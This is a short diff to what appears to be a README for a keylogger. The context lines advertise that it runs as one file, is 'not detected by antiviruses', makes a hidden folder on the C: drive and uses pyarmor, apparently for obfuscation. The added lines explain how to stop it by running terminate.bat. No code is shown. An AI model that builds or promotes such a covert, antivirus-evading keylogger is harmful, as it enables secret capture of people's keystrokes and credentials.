@@ -45,3 +45,6 @@ and pyarmor.
 + Working exclusively with one file, no compounds, no problems
 + Not detected by antiviruses
 + Making hidden foulder in C:\ disk
+
+# Terminating Keylogger
+So as to terminate the session of keylogger launch ```terminate.bat```
